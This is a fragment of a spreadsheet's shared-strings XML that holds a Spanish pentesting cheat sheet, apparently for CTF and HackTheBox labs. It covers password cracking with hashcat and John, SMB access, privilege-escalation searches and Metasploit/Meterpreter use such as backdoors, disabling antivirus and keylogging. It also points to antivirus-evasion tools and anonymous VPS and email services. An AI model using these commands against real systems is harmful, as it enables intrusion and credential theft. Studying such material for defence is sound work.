    <t>https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki</t>
  </si>
  <si>
    <t>PhoneInfoga</t>
  </si>
  <si>
    <t>osint numero de telefonos</t>
  </si>
  <si>
    <t>PHONEINFOGA</t>
  </si>
  <si>
    <t>SPIDERFOOT</t>
  </si>
  <si>
    <t>Spiderfoot</t>
  </si>
  <si>
    <t xml:space="preserve"> Escaneo muy chulo con diferentes opciones</t>
  </si>
  <si>
    <t>Enumerar plugins vulnerables</t>
  </si>
  <si>
    <t>mixed es pasivo y agresivo</t>
  </si>
  <si>
    <t>nmap --scripts http-enum.nse --script-args http-enum.basepath='webservices/' 10.10.10.10</t>
  </si>
  <si>
    <t>Para enumerar recursos de paginas</t>
  </si>
  <si>
    <t>Hay que pasarle el argumento de donde empieza el fuzz</t>
  </si>
  <si>
    <t>chmodcommand.com</t>
  </si>
  <si>
    <t>torsocks</t>
  </si>
  <si>
    <t>Nos permite utilizar la mayoria de los programas dentro de la red TOR</t>
  </si>
  <si>
    <t>ln -s -f /root/root.txt index.htm</t>
  </si>
  <si>
    <t>systemctl list-timers</t>
  </si>
  <si>
    <t>regex101.com</t>
  </si>
  <si>
    <t>macro_pack</t>
  </si>
  <si>
    <t>Macro_Pack</t>
  </si>
  <si>
    <t>WinBruteLogon.exe</t>
  </si>
  <si>
    <r>
      <t>API </t>
    </r>
    <r>
      <rPr>
        <b/>
        <i/>
        <sz val="8"/>
        <color rgb="FF333333"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>LogonUserW que no bloquea intentos fallidos de logon</t>
    </r>
  </si>
  <si>
    <t>Buscar en el directorio en el que se esta todos los archivos de configuracion</t>
  </si>
  <si>
    <t>Hace falta instalar ltrace con apt-get</t>
  </si>
  <si>
    <t>find / -perm -u=s 2&gt;/dev/null</t>
  </si>
  <si>
    <t>juicy potato</t>
  </si>
  <si>
    <t>uacamola</t>
  </si>
  <si>
    <t>cd /opt &amp;&amp; https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite</t>
  </si>
  <si>
    <t>Escalada multiplataforma</t>
  </si>
  <si>
    <t>LinPeas / WinPeas</t>
  </si>
  <si>
    <t xml:space="preserve"> | awk '{print $2}' | grep -v local | tr ': ' ' ' | awk 'NF{print $NF}' | sort -u</t>
  </si>
  <si>
    <t>Linux 6.x /proc/PID/net/tcp</t>
  </si>
  <si>
    <t>scp -r /opt/AutoBlue-MS17-010 Ama@172.20.0.80:/home/Ama</t>
  </si>
  <si>
    <t>mv ..</t>
  </si>
  <si>
    <t>CMD Windows</t>
  </si>
  <si>
    <t>dir *flag* /s  C:/</t>
  </si>
  <si>
    <t>en C:/</t>
  </si>
  <si>
    <t>dir flag*.txt /s</t>
  </si>
  <si>
    <t>Lo mismo pero que tengan la extension .txt</t>
  </si>
  <si>
    <t>NET LOCALGROUP "Remote Desktop Users" /ADD</t>
  </si>
  <si>
    <t>Crea el grupo de escritorio remoto</t>
  </si>
  <si>
    <t xml:space="preserve">base64 -d "archivo" </t>
  </si>
  <si>
    <t>ETERNALBLUE</t>
  </si>
  <si>
    <t>HASHCAT</t>
  </si>
  <si>
    <t>.\hashcat64.exe -m 9600 -o cracked hashOffice.txt rockyou.txt</t>
  </si>
  <si>
    <t>.\hashcat64.exe -m 13400 -o KeepassDecrypted.txt HashKeepass.txt dickeepass.txt</t>
  </si>
  <si>
    <t>.\hashcat64.exe -m 13400 -o KeepassDecrypted.txt HashKeepass.txt -a 6 dickeepass.txt ?d?d?d?d</t>
  </si>
  <si>
    <t>.\hashcat64.exe -a 0 -o Flag3Decrypted.txt 7dffda1f0307d9a770c1e18c4dde26ab DicFlag3.txt</t>
  </si>
  <si>
    <t>.\hashcat64.exe -m 12500 -o rar.txt rar3.txt names.txt</t>
  </si>
  <si>
    <t xml:space="preserve">crackea rar3 con diccionario </t>
  </si>
  <si>
    <t>crackea Office2013 con diccionario</t>
  </si>
  <si>
    <t>crackea Keepass con diccionario</t>
  </si>
  <si>
    <t>crakea Keepass con Hybrido (diccionario+mascara)</t>
  </si>
  <si>
    <t>crakea MD5 con diccionario</t>
  </si>
  <si>
    <t>JOHN</t>
  </si>
  <si>
    <t>john --rules --wordlist=yourwordlist.txt hash.txt</t>
  </si>
  <si>
    <t>john --rules --wordlist=/usr/share/wordlists/rockyou.txt Office.txt</t>
  </si>
  <si>
    <t>copy badboys.rar \\172.20.0.80\smbFolder\archivo</t>
  </si>
  <si>
    <t>En este caso un Hash de Office</t>
  </si>
  <si>
    <t>./hashcat64.bin -m 0 -b</t>
  </si>
  <si>
    <t>-d para profundidad del spider -o que pueda visitar otras webs</t>
  </si>
  <si>
    <t>cewl -d 5 -o http://www.paginaweb.com &gt; diccionario.txt</t>
  </si>
  <si>
    <t>crunch 8 8 -t B@%%%%%% -o DicFlag3.txt</t>
  </si>
  <si>
    <t>https://hashcat.net/wiki/doku.php?id=example_hashes</t>
  </si>
  <si>
    <t>0 Straight Dicctionary | 1 Combination | 3 Bruteforce with mask | 6 Hybrid Wordlist+Mask | 7 Hybrid Mask+Wordlist</t>
  </si>
  <si>
    <t>https://www.securityartwork.es/2017/02/15/cracking-contrasenas-hashcat/</t>
  </si>
  <si>
    <t>https://hashcat.net/wiki/</t>
  </si>
  <si>
    <t xml:space="preserve">Core attack modes </t>
  </si>
  <si>
    <t>Supported attack modes</t>
  </si>
  <si>
    <t>https://hashcat.net/wiki/doku.php?id=hashcat</t>
  </si>
  <si>
    <t>secpol.msc "Permitir inicio de sesión a pesar de Servicios de Escritorio Remoto"</t>
  </si>
  <si>
    <t>https://jesux.es/cracking/passwords-cracking/</t>
  </si>
  <si>
    <t>Crea un diccionario con patrones https://blog.ehcgroup.io/2019/01/09/15/29/15/4518/como-utilizar-crunch-una-guia-completa/hacking/ehacking/</t>
  </si>
  <si>
    <t>-O para optimizar Kernel</t>
  </si>
  <si>
    <t>Aumenta la velocidad</t>
  </si>
  <si>
    <t>https://countuponsecurity.files.wordpress.com/2016/09/jtr-cheat-sheet.pdf</t>
  </si>
  <si>
    <t>Cheatsheet John</t>
  </si>
  <si>
    <t>smbclient:</t>
  </si>
  <si>
    <t>Cliente parecido al ftp para acceder a recursos compartidos en servidores SMB/CIFS.</t>
  </si>
  <si>
    <t>smbget:</t>
  </si>
  <si>
    <t>Utilidad parecida al wget para descargar archivos desde servidores SMB.</t>
  </si>
  <si>
    <t>smbcacls:</t>
  </si>
  <si>
    <t>Herramienta para manipular las Listas de Control de Acceso NT en carpetas o archivos compartidos de tipo SMB.</t>
  </si>
  <si>
    <t>smbclient -L w2003 -U trancos</t>
  </si>
  <si>
    <t>smbclient //w2003/tierramedia -U pipin</t>
  </si>
  <si>
    <t>net localgroup NombreGrupo</t>
  </si>
  <si>
    <t>john --format=NT  /usr/share/wordlists/rockyou.txt hashOffice.txt</t>
  </si>
  <si>
    <t>2john</t>
  </si>
  <si>
    <t>Scripts en python para tranformar archivos en Hashes para John</t>
  </si>
  <si>
    <t>openMP</t>
  </si>
  <si>
    <t>Para aumentar los cores en john</t>
  </si>
  <si>
    <t>Hay que volver a reconstruir john para ello</t>
  </si>
  <si>
    <t>hashview</t>
  </si>
  <si>
    <t>https://github.com/ctxis/crackerjack</t>
  </si>
  <si>
    <t>https://github.com/s3inlc/hashtopolis</t>
  </si>
  <si>
    <t>hace falta una BD y otras cosas</t>
  </si>
  <si>
    <t>john --show --format=NT hash.txt</t>
  </si>
  <si>
    <t>python3 dirsearch.py -u 172.20.0.99:80 -e php -t 1 -w /usr/share/dirb/wordlists/small.txt -f -s 1 -r -R 5 -F</t>
  </si>
  <si>
    <t>```</t>
  </si>
  <si>
    <t>Hola</t>
  </si>
  <si>
    <t>que tal</t>
  </si>
  <si>
    <t>`</t>
  </si>
  <si>
    <t>Conectar Nessus con la BD en metasploit</t>
  </si>
  <si>
    <t>Load Nessus en msf</t>
  </si>
  <si>
    <t>Actualiza repositorios y fuerza una actualización completa de la distro</t>
  </si>
  <si>
    <t>Actualiza DBLocate con los ultimos ficheros y rutas añadidas</t>
  </si>
  <si>
    <t>Nos muestra y lista los archivos con formato largo y los archivos ocultos</t>
  </si>
  <si>
    <t xml:space="preserve">Convierte una cadena en hexadecimal de forma reversa </t>
  </si>
  <si>
    <t>-r es de forma reversa -ps salida postscript</t>
  </si>
  <si>
    <t>Para ver lo que el usuario puede ejecutar</t>
  </si>
  <si>
    <t>Segun el ttl se puede saber que sistema es, 64 linux 128 windows 254 Solaris AIX</t>
  </si>
  <si>
    <t>Independiza el proceso por si acaso lo matan</t>
  </si>
  <si>
    <t>Para ver los grupos en los que estamos</t>
  </si>
  <si>
    <t>Nos muestra en tiempo real el archivo, por si cambia con un trabajo cron</t>
  </si>
  <si>
    <t>Para ver las tareas programadas</t>
  </si>
  <si>
    <t>Para consultar cuando nos diga que tiene un mensaje</t>
  </si>
  <si>
    <t>En pop3</t>
  </si>
  <si>
    <t>Para crear e implementar funciones como la de extracion de puertos o la ruta de go</t>
  </si>
  <si>
    <t>Nos dice que tipo de archivo es</t>
  </si>
  <si>
    <t>Para ver las llamadas que hace un programa, se usa en reversing</t>
  </si>
  <si>
    <t>Ver recursos de los que el usuario es propietario y elimina los errores</t>
  </si>
  <si>
    <t>Para ver tareas con temporizadores y cuanto les queda</t>
  </si>
  <si>
    <t>Nos muestra tareas cron, pero no tareas que esten gestionadas con un script, que se esten ejecutando a nivel de sistema</t>
  </si>
  <si>
    <t>Hay que reiniciar</t>
  </si>
  <si>
    <t>apt-get intall kali-grant-root &amp;&amp; dpkg-reconfigure kali-grant-root</t>
  </si>
  <si>
    <t>Ejecutar sudo sin contraseña Kali &gt; 2020.1</t>
  </si>
  <si>
    <t>#</t>
  </si>
  <si>
    <t>##</t>
  </si>
  <si>
    <t>qwew</t>
  </si>
  <si>
    <t>Habilitar servicio en el arranque</t>
  </si>
  <si>
    <t>Tambien se puede hacer asi: update-rc.d postgresql enable &amp;&amp; update-rc.d</t>
  </si>
  <si>
    <t>Para salir de una prompt limitada, hace falta que la maquina tenga python instalado</t>
  </si>
  <si>
    <t xml:space="preserve">Invocar una Shell Python Bash cuando tenemos un prompt limitado </t>
  </si>
  <si>
    <t>Termina el programa</t>
  </si>
  <si>
    <t>Para matar el proceso</t>
  </si>
  <si>
    <t>Para salir del programa pero lo para no lo mata, lo deja en background depende del programa</t>
  </si>
  <si>
    <t>Para matar todos los procesos con el mismo nombre</t>
  </si>
  <si>
    <t>Ver que tenemos en Background de una shell</t>
  </si>
  <si>
    <t>Para traerlo adelante</t>
  </si>
  <si>
    <t>Para encadenar comandos</t>
  </si>
  <si>
    <t>Nos da toda la informacion del sistema</t>
  </si>
  <si>
    <t>Es equivalente a usar -all</t>
  </si>
  <si>
    <t>Para limpiar la terminal</t>
  </si>
  <si>
    <t>Para cambiar de usuario en la terminal</t>
  </si>
  <si>
    <t>Usuario que ejecuta algo</t>
  </si>
  <si>
    <t>Para ver todos los comandos usados</t>
  </si>
  <si>
    <t xml:space="preserve"> Para instalar paquetes debian</t>
  </si>
  <si>
    <t>Para ver uso del sistema</t>
  </si>
  <si>
    <t>Para ver que usuarios estan conectados ahora mismo al sistema</t>
  </si>
  <si>
    <t>Tiempo de encendido</t>
  </si>
  <si>
    <t>Para compilar e instalar paquetes normalmente</t>
  </si>
  <si>
    <t>Por ese orden</t>
  </si>
  <si>
    <t>Para ver procesos de una forma mas intuitiva e interactiva</t>
  </si>
  <si>
    <t>Para ver todos los procesos</t>
  </si>
  <si>
    <t>Ver las n primeras lineas de un archivo</t>
  </si>
  <si>
    <t>Ver las n ultimas lineas de un archivo</t>
  </si>
  <si>
    <t>Si sale que tiene /bin/bash o algo es que tiene shell /bin/false no tiene Shell</t>
  </si>
  <si>
    <t>Determina quien puede acceder al sistema de manera legitima y que se puede hacer una vez dentro del sistema</t>
  </si>
  <si>
    <t>Descomprimir gz</t>
  </si>
  <si>
    <t>Ej: /usr/share/wordlists/rockyou.txt.gz</t>
  </si>
  <si>
    <t>Para ver las lineas que tiene un archivo</t>
  </si>
  <si>
    <t>Mostrar la tabla arp</t>
  </si>
  <si>
    <t>Ver la version del kernel de linux</t>
  </si>
  <si>
    <t>Ver cuanto tiempo tarda un proceso en ejecutarse</t>
  </si>
  <si>
    <t>Reverse search</t>
  </si>
  <si>
    <t>Filtrar los que no contengan el patron indicado</t>
  </si>
  <si>
    <t>Verificar conectividad y transferencia de datos</t>
  </si>
  <si>
    <t>Abreviatura de: client url</t>
  </si>
  <si>
    <t>Para ver cuanto pesa un archivo</t>
  </si>
  <si>
    <t>Para quitar los line fits cuando tienen salto de lineas y lo pone en varias lineas porque llega al ancho de linea</t>
  </si>
  <si>
    <t>Para convertir en binario le damos permisos de ejecución</t>
  </si>
  <si>
    <t>Para saber el metodo de encriptacion de las cuentas de usuarios</t>
  </si>
  <si>
    <t>Para ordenar y quitar duplicados</t>
  </si>
  <si>
    <t xml:space="preserve"> Para ver cada segundo como cambia un comando que se le pase </t>
  </si>
  <si>
    <t>Para listar directorios de forma recursiva</t>
  </si>
  <si>
    <t>Para ver como cambia el peso de un archivo cada segundo</t>
  </si>
  <si>
    <t>Util para ver por ejemplo si un script o tarea hace cambios en un fichero</t>
  </si>
  <si>
    <t>Util para ver por ejemplo con "w" si se conecta algun usuario</t>
  </si>
  <si>
    <t>Util para listar todas las configuraciones y ver si tienen alguna password, con grep se podria automatizar esto mismo</t>
  </si>
  <si>
    <t>Por ejemplo en el caso anterior poniendo | xargs grep "root" nos buscaria root en cada uno de los archivos</t>
  </si>
  <si>
    <t>Filtrado de multiples campos</t>
  </si>
  <si>
    <t>grep -E "A|B|C"</t>
  </si>
  <si>
    <t>Para ver el abecedario ascii</t>
  </si>
  <si>
    <t>Para comprobar si tenemos archivos con el bit suid activado</t>
  </si>
  <si>
    <t>Cuando hacemos un cp si ponemos espacio y . nos lo copia al directorio actual</t>
  </si>
  <si>
    <t>Cuando copiamos o movemos un archivo si ponemos espacio y .. Nos lo copia un directorio mas arriba</t>
  </si>
  <si>
    <t>Descifra base64 de una cadena</t>
  </si>
  <si>
    <t>Tambien se puede hacer: cat/echo "archivo | base64 -deb</t>
  </si>
  <si>
    <t>por ejemplo lineas de contraseña de un archivo de diccionario</t>
  </si>
  <si>
    <t>Para descargar maquinas virtuales</t>
  </si>
  <si>
    <t>Maquina virtual catalogada con diferentes tipos de ataque</t>
  </si>
  <si>
    <t>Aplicaciones antiguas vulnerables, de demostracion</t>
  </si>
  <si>
    <t>Para buscar binarios</t>
  </si>
  <si>
    <t>Para buscar recursos</t>
  </si>
  <si>
    <t>Para buscar directorios</t>
  </si>
  <si>
    <t>Para saber si tenemos una herramienta instalada</t>
  </si>
  <si>
    <t>Si pone /bin/false no tiene shell</t>
  </si>
  <si>
    <t>Busca el nombre del fichero que le pasamos</t>
  </si>
  <si>
    <t>Nos da el directorio del binario</t>
  </si>
  <si>
    <t>INSTALACIÓN HERRAMIENTAS</t>
  </si>
  <si>
    <t>Encoder y Wrapper de binarios</t>
  </si>
  <si>
    <t>Evasion bypass antivirus</t>
  </si>
  <si>
    <t>Como veil para encodear binarios</t>
  </si>
  <si>
    <t>Explorador mantra, muy util para pentesting</t>
  </si>
  <si>
    <t>Multitud de herramientas, opciones y filtros para pentesting web</t>
  </si>
  <si>
    <t>Alternativa a Hydra y Medusa</t>
  </si>
  <si>
    <t>Como KeepNote</t>
  </si>
  <si>
    <t>Organizador de notas</t>
  </si>
  <si>
    <t>Framework para ataques hombre en el medio en RED</t>
  </si>
  <si>
    <t>Para convertir paquetes rpm a deb</t>
  </si>
  <si>
    <t>Si no funciona hacer un install de openssl y un autoremove</t>
  </si>
  <si>
    <t>Instalar Powershell</t>
  </si>
  <si>
    <t>Editor de texto muy chulo que permite editar arhivos con cursor, y ademas identifica el typo de archivo y la sintaxis</t>
  </si>
  <si>
    <t>Como Veil y Shellter</t>
  </si>
  <si>
    <t>Dirsearch fuzzing web muy bueno</t>
  </si>
  <si>
    <t>Mas completo que el anterior, se pueden definir niveles de profundidad de busqueda</t>
  </si>
  <si>
    <t>Comprueba parches faltantes para hacer escalada de privilegios W10</t>
  </si>
  <si>
    <t>Si vemos un proceso corriendo llamado knock es port knocking nos permite levantar un puerto sin que este constantemente abierto como ssh, pero antes hay que hacer un golpeo de puertos para levantarlo, protege el servidor contra escaneo de puertos es invisible a nmap, no levanta servicio, es un demonio de bajo nivel, bucar knockd.conf para ver el golpeo de puertos</t>
  </si>
  <si>
    <t>Lo de arriba pero en herramienta</t>
  </si>
  <si>
    <t>authbin nos permite ejecutar programas que normalmente requiera privilegios con un usuario no privilegiado como con puertos TCP por debajo de 1024</t>
  </si>
  <si>
    <t>authbin y comando como un script en python</t>
  </si>
  <si>
    <t>Colección de herramientas en python nos permite montar un smb o samba</t>
  </si>
  <si>
    <t>Para monitorizar procesos sin permisos de root</t>
  </si>
  <si>
    <t>Muy Util para detectar tareas Cron</t>
  </si>
  <si>
    <t>Escalada multi plataforma</t>
  </si>
  <si>
    <t>Privesc multi plataforma</t>
  </si>
  <si>
    <t>ventajas sobre netcat se puede usar history de comando y limpiar terminal</t>
  </si>
  <si>
    <t>Como virus total pero no envia firmas</t>
  </si>
  <si>
    <t>https://nodistribute.com/</t>
  </si>
  <si>
    <t>https://any.run/</t>
  </si>
  <si>
    <t>https://www.hybrid-analysis.com/?lang=es</t>
  </si>
  <si>
    <t>Para levantar puertos con port knocking</t>
  </si>
  <si>
    <t>Nos saca los directorios donde tenemos permisos filtrando por las que empiezen por ntuser</t>
  </si>
  <si>
    <t>Con bash scripting</t>
  </si>
  <si>
    <t>Hace que la salida del primero se convierta en la entrada del segundo.</t>
  </si>
  <si>
    <t>Longitud minima de 8, que empieza por B le sigue minuscula y lo demas digitos hasta el 8</t>
  </si>
  <si>
    <t>Crear listas de palabras personalizadas haciendo “spidering” en los sitios web objetivos y capturando palabras únicas.</t>
  </si>
  <si>
    <t>Pagina diccionario passwords</t>
  </si>
  <si>
    <t>Passwords de leaks ordenados por numero de veces que aparece</t>
  </si>
  <si>
    <t>En metasploit  diccionario de servicios como pogrestsql</t>
  </si>
  <si>
    <t>Crea diccionario de palabras personalizas de la web dada</t>
  </si>
  <si>
    <t>Codificacion unicode letras a simple vistas normales en la url para hacer phishing</t>
  </si>
  <si>
    <t>Framework de autorización, que lo que hace es permitir que las aplicaciones obtengan acceso limitado a las cuentas de usuario de algunos servicios como Facebook, Google, Twitter y GitHub</t>
  </si>
  <si>
    <t>Explicacion de maquinas retiradas HTB</t>
  </si>
  <si>
    <t>Sustitucion de archivos binarios, para arrancar cmd y cambiar contraseña</t>
  </si>
  <si>
    <t>Para indentificar extensiones PBX o VoIP</t>
  </si>
  <si>
    <t>Instala las dependencia de python</t>
  </si>
  <si>
    <t>Instala las dependencias de python3</t>
  </si>
  <si>
    <t>Convierte scripts de python2 a phyton3 en debian</t>
  </si>
  <si>
    <t>Base de datos de md5 descifrados.</t>
  </si>
  <si>
    <t>Desencriptar hashes, cripter, formulas matematicas, decodificadores….</t>
  </si>
  <si>
    <t>Cifrado, codificación, compresión, entre otros…</t>
  </si>
  <si>
    <t>Desencryptar vigenere</t>
  </si>
  <si>
    <t xml:space="preserve">Es un metodo de sustitucion de clave maestra en texto </t>
  </si>
  <si>
    <t>Para crackear hashes</t>
  </si>
  <si>
    <t>Para desencriptar hashes</t>
  </si>
  <si>
    <t>En kali para ver una cadena que tipo de hash es</t>
  </si>
  <si>
    <t>Decodea y revierte y nos muestra en texto plano una cadena hexadecimal</t>
  </si>
  <si>
    <t>Para ver cuando vemos una lista de hashes como estan encryptados, como se encryptan en Linux $5$ es sha-256</t>
  </si>
  <si>
    <t>CRYPTOGRAFIA &amp; ENCODE/DECODE</t>
  </si>
  <si>
    <t>Para ver las funciones cargadas en memoria</t>
  </si>
  <si>
    <t>Para cambiar la directiva en powershell y que nos permita ejecutar scripts</t>
  </si>
  <si>
    <t>Si no no nos deja cargar scripts propios</t>
  </si>
  <si>
    <t>Importar modulos a powershell</t>
  </si>
  <si>
    <t>Invoke web request aparece en version 3</t>
  </si>
  <si>
    <t>Para ver la ayuda de la funcion</t>
  </si>
  <si>
    <t>Para ver los ejemplos de uso de la funcion</t>
  </si>
  <si>
    <t xml:space="preserve">Formatea la salida del objeto </t>
  </si>
  <si>
    <t>Para ver alias comandos cmd powershell</t>
  </si>
  <si>
    <t>Todos los comandos powershell</t>
  </si>
  <si>
    <t>Para ver la arquitectura y migrar el proceso</t>
  </si>
  <si>
    <t>Si nos daba problemas con algo, si estabamos en un proceso de 32 y arquitectura de 64</t>
  </si>
  <si>
    <t>Para ver si estamos en un proceso de 64 y migrar</t>
  </si>
  <si>
    <t>Para iniciar un powershell desde su ruta nativa y descargar y cargarle una funcion en memoria</t>
  </si>
  <si>
    <t>Para conectarnos al samba que hemos montado desde windows y para invocarlo</t>
  </si>
  <si>
    <t>Para cargar version 2 de powershell y saltarnos la limitacion del language mode restritec del contrainedLanguage</t>
  </si>
  <si>
    <t>Copia un archivo por linea de comando a la carpeta compartida por smb</t>
  </si>
  <si>
    <t>Normalmente smb levantado en Kali smbFolder es la carpeta levantada con impackets</t>
  </si>
  <si>
    <t>Nos busca cualquier archivo que tenga en su nombre flag</t>
  </si>
  <si>
    <t>Nos muestra el Path del exploit y nos copia el path</t>
  </si>
  <si>
    <t>Para examinar un exploit</t>
  </si>
  <si>
    <t>Busca exploits en exploitdb sin usar internet</t>
  </si>
  <si>
    <t xml:space="preserve">Chuleta de reverseshell en distintos lenguajes   </t>
  </si>
  <si>
    <t>Chuleta de stego</t>
  </si>
  <si>
    <t>En base a un binario nos dice como podemos explotarlo, nos puede enseñar por ejemplo a explotar perl con privilegios sudo</t>
  </si>
  <si>
    <t>Guia para escada de privilegios en linux</t>
  </si>
  <si>
    <t>Pagina</t>
  </si>
  <si>
    <t>Para actualizar los repositorios</t>
  </si>
  <si>
    <t>Para actualizar los repositorios que hemos forkeado</t>
  </si>
  <si>
    <t>Tiene que tener minimo permisos chmod 600 si no nos dira que es insegura y no nos podremos autenticar</t>
  </si>
  <si>
    <t>En nuestra maquina teniendo levantado servicio ssh podemos usar el archivo de identificacion rsa usuariocomprometido@localhost -p 4646 nos conectaremos al SSH que esta cerrado en la maquina comprometida</t>
  </si>
  <si>
    <t>Un ssh Reverso</t>
  </si>
  <si>
    <t>En ssh port ford warding -fNT hace la conexion en segundo plano sin entrar para no perder la consola</t>
  </si>
  <si>
    <t>Redirecionamos el servicio a un puerto de nuestra maquina 5901 al 4444 de nuestra maquina</t>
  </si>
  <si>
    <t>Transferir de host a servidor una carpeta</t>
  </si>
  <si>
    <t>Nos permite ssh sin contraseña con un certificado RSA</t>
  </si>
  <si>
    <t>vncviewer localhost:4444 Comando que usamos para conectarnos</t>
  </si>
  <si>
    <t>Para descargarnos las cosas del FTP de forma recursiva</t>
  </si>
  <si>
    <t>Recibir sms gratis</t>
  </si>
  <si>
    <t>Para ver si una direccion si tiene contraseñas filtradas</t>
  </si>
  <si>
    <t>Para comprar vps de manera anonima</t>
  </si>
  <si>
    <t>Mandar emails anonimos</t>
  </si>
  <si>
    <t>Password por defecto de router</t>
  </si>
  <si>
    <t>Para descargar app vulnerables y poder probar vulnerabilidades</t>
  </si>
  <si>
    <t xml:space="preserve">Se pueden poner los permisos que queramos y nos dice el numero </t>
  </si>
  <si>
    <t>Para empaquetar binarios</t>
  </si>
  <si>
    <t xml:space="preserve">Para probar sintaxis de expresiones </t>
  </si>
  <si>
    <t>Crea dominios temporales para hacer conexiones inversas estilo no-ip, hace una redireccion.</t>
  </si>
  <si>
    <t>Como SSH para Windows</t>
  </si>
  <si>
    <t>Para buscar equipos de la organización</t>
  </si>
  <si>
    <t xml:space="preserve">Para que no muestre la principal y los subdominios </t>
  </si>
  <si>
    <t>Dorks pre-construidos google</t>
  </si>
  <si>
    <t>Solo en Bing para ver que otras paginas web comparten servidor</t>
  </si>
  <si>
    <t>Consultas Whois</t>
  </si>
  <si>
    <t>Reporte pagina web</t>
  </si>
  <si>
    <t>Para sistemas autonomos</t>
  </si>
  <si>
    <t>IP y maquinas compartidas y mas cosas</t>
  </si>
  <si>
    <t>https://www.robtex.com/</t>
  </si>
  <si>
    <t>Hace ping y escanea</t>
  </si>
  <si>
    <t>Para microsoft modernos</t>
  </si>
  <si>
    <t>Solo hace escaneo ping sweep</t>
  </si>
  <si>
    <t>Top 10 puertos nmap</t>
  </si>
  <si>
    <t>Para que solo muestre los puertos abiertos</t>
  </si>
  <si>
    <t>No realiza resolucion dns</t>
  </si>
  <si>
    <t>Al no realizar resolucion de nombres va un poco mas rapido</t>
  </si>
  <si>
    <t>Si la version esta entre la 2.02 y la 5.21 se puede elevar privilegios nos da sh root</t>
  </si>
  <si>
    <t xml:space="preserve">Se incluye en -sV que es mas completo  </t>
  </si>
  <si>
    <t>Vulnerabilidades conocidas en el puerto indicado y el servicio asociado</t>
  </si>
  <si>
    <t>Nos dara un informe mas completo</t>
  </si>
  <si>
    <t>masscan &amp; unicornscan</t>
  </si>
  <si>
    <t>Vulnerabilidades conocidas en el puerto indicado que sean vulnerables y seguras</t>
  </si>
  <si>
    <t>No funciona para escaneos windows</t>
  </si>
  <si>
    <t>Alternativas nmap</t>
  </si>
  <si>
    <t>Convertir paquete rpm a deb</t>
  </si>
  <si>
    <t>Instalar</t>
  </si>
  <si>
    <t>Escaneo de puertos fiable hecho en go</t>
  </si>
  <si>
    <t>Realiza pruebas a dns como transferencia de zona</t>
  </si>
  <si>
    <t>Para analizar dominios y subdominios</t>
  </si>
  <si>
    <t>Analizar subdominios</t>
  </si>
  <si>
    <t>Busca certificados reservados de aplicaciones que aun no han salido.</t>
  </si>
  <si>
    <t>Saca subdominios</t>
  </si>
  <si>
    <t xml:space="preserve">Para buscar subdominios en pruebas de Red Team de aplicaciones en pre produccion </t>
  </si>
  <si>
    <t>Nos muestra los puertos TCP que estan abiertos de forma interna, nos los da en hexadecimal y es la 2 tabla</t>
  </si>
  <si>
    <t>Para mostrar los puertos cuando hacemos un escaneo de puertos internos con proc/net/tcp</t>
  </si>
  <si>
    <t>Tenemos que tener acceso interno a la maquina</t>
  </si>
  <si>
    <t>Para ver los procesos en tiempo real</t>
  </si>
  <si>
    <t>Mientras estamos logueados en un servidor de correo pop3 para ver si tiene algun email</t>
  </si>
  <si>
    <t>Numero del correo para abrirlo</t>
  </si>
  <si>
    <t>Verificar si existe el usuario root</t>
  </si>
  <si>
    <t>POP3</t>
  </si>
  <si>
    <t>retr numero</t>
  </si>
  <si>
    <t>Analizar rpcbind</t>
  </si>
  <si>
    <t xml:space="preserve">Si conseguimos el hash y lo crakeamos podremos conectarnos a la VPN sin usuario y contraseña </t>
  </si>
  <si>
    <t xml:space="preserve">Para sacar el hash PDP de las VPN </t>
  </si>
  <si>
    <t>Para hacer llamadas knock</t>
  </si>
  <si>
    <t>Conexion al smb como un usuario</t>
  </si>
  <si>
    <t>Tierra media es la carpetas</t>
  </si>
  <si>
    <t>Ver lo que tiene compartido SMB</t>
  </si>
  <si>
    <t>Conectarnos al smb con una sesion nula o sin proporcionar credenciales</t>
  </si>
  <si>
    <t>Para ver los permisos reales de las carpetas ya que los que salen no son reales</t>
  </si>
  <si>
    <t>Montar una unidad o carpeta con permisos lectura escritura</t>
  </si>
  <si>
    <t>Montar una unidad de RED en Linux, hace falta tener instalado el paquete cifs-utils</t>
  </si>
  <si>
    <t>Para ver si es vulnerable a heartbleed</t>
  </si>
  <si>
    <t>Para background en algunos exploits como shell</t>
  </si>
  <si>
    <t>Para quitar el modulo que este cargado en metasploit</t>
  </si>
  <si>
    <t>Mostrar payload seleccionado</t>
  </si>
  <si>
    <t>Muestra las versiones y arquitecturas de las que puede ser objetivo el exploit</t>
  </si>
  <si>
    <t>Ver la info del exploit</t>
  </si>
  <si>
    <t>Para añadir variable global</t>
  </si>
  <si>
    <t>Si usas tabulador en metasploit en una configuracion de exploit te pone el valor por defecto</t>
  </si>
  <si>
    <t>Si no conecta con la BD</t>
  </si>
  <si>
    <t>Para ejecutar un exploit en background</t>
  </si>
  <si>
    <t>Para ver los trabajos en 2 plano</t>
  </si>
  <si>
    <t>Para añadir ruta y pivotar</t>
  </si>
  <si>
    <t>set target "numero"</t>
  </si>
  <si>
    <t>Ejecutar comandos por smb contra Windows</t>
  </si>
  <si>
    <t>Se ejecuta metasploit con nuestro exploit en formato resource</t>
  </si>
  <si>
    <t>exploit -j</t>
  </si>
  <si>
    <t>Para comprobar si estamos en una maquina virtual</t>
  </si>
  <si>
    <t>Para ver las variables de entorno</t>
  </si>
  <si>
    <t>Para cargar la lista de aplicaciones y su version</t>
  </si>
  <si>
    <t>Informacion, registro, hashes</t>
  </si>
  <si>
    <t>Para volver a los permisos antes de escalar</t>
  </si>
  <si>
    <t>Carga un servidor vnc</t>
  </si>
  <si>
    <t>Para crear un backdoor</t>
  </si>
  <si>
    <t xml:space="preserve">Cuando ya no queramos el backdoor usar resource y la ubicacion de cleanup .rc que nos proporciono al crear el backdoor mirar la opcion -S para ver si se puede conectar con privilegios System </t>
  </si>
  <si>
    <t>Directa o inversa</t>
  </si>
  <si>
    <t>Si vemos que no nos captura nada, tenemos que mirar el usuario con el que estamos conectados que no sea un NT/Autor... que nunca se conectara, y migrar el proceso al usuario y ya nos capturara</t>
  </si>
  <si>
    <t>Para ver los usuarios logeados</t>
  </si>
  <si>
    <t>Comprueba las medidas de seguridad</t>
  </si>
  <si>
    <t>Para controlar el raton o teclado</t>
  </si>
  <si>
    <t>Puede deshabilitar AV, Firewall y otros</t>
  </si>
  <si>
    <t>Solo funciona en Windows, Meterpreter en Linux es mucho mas limitado</t>
  </si>
  <si>
